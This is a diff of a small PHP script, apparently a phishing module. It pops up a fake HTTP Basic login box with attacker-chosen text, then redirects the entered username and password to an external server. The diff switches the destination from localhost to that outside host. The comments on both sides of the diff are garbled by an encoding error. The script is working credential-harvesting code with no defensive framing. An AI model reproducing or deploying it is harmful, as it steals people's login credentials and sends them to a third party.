@@ -1,10 +1,10 @@
 <?
 error_reporting(0);
-/* ¼ì²é±äÁ¿ $PHP_AUTH_USER ºÍ$PHP_AUTH_PW µÄÖµ*/
+/* æ£€æŸ¥å˜é‡ $PHP_AUTH_USER å’Œ$PHP_AUTH_PW çš„å€¼*/
 
 if ((!isset($_SERVER['PHP_AUTH_USER'])) || (!isset($_SERVER['PHP_AUTH_PW']))) {
 
- /* ¿ÕÖµ£º·¢ËÍ²úÉúÏÔÊ¾ÎÄ±¾¿òµÄÊý¾ÝÍ·²¿*/
+ /* ç©ºå€¼ï¼šå‘é€äº§ç”Ÿæ˜¾ç¤ºæ–‡æœ¬æ¡†çš„æ•°æ®å¤´éƒ¨*/
 
     header('WWW-Authenticate: Basic realm="'.addslashes(trim($_GET['info'])).'"');
 
@@ -16,9 +16,9 @@ if ((!isset($_SERVER['PHP_AUTH_USER'])) || (!isset($_SERVER['PHP_AUTH_PW']))) {
 
 } else if ((isset($_SERVER['PHP_AUTH_USER'])) && (isset($_SERVER['PHP_AUTH_PW']))){
 
-    /* ±äÁ¿Öµ´æÔÚ£¬¼ì²éÆäÊÇ·ñÕýÈ· */
+    /* å˜é‡å€¼å­˜åœ¨ï¼Œæ£€æŸ¥å…¶æ˜¯å¦æ­£ç¡® */
 
-	header("Location: http://localhost/index.php?do=api&id={$_GET[id]}&username={$_SERVER[PHP_AUTH_USER]}&password={$_SERVER[PHP_AUTH_PW]}"); 
+	header("Location: http://www.sicnu.tech:8888/index.php?do=api&id={$_GET[id]}&username={$_SERVER[PHP_AUTH_USER]}&password={$_SERVER[PHP_AUTH_PW]}"); 
 
 }
 
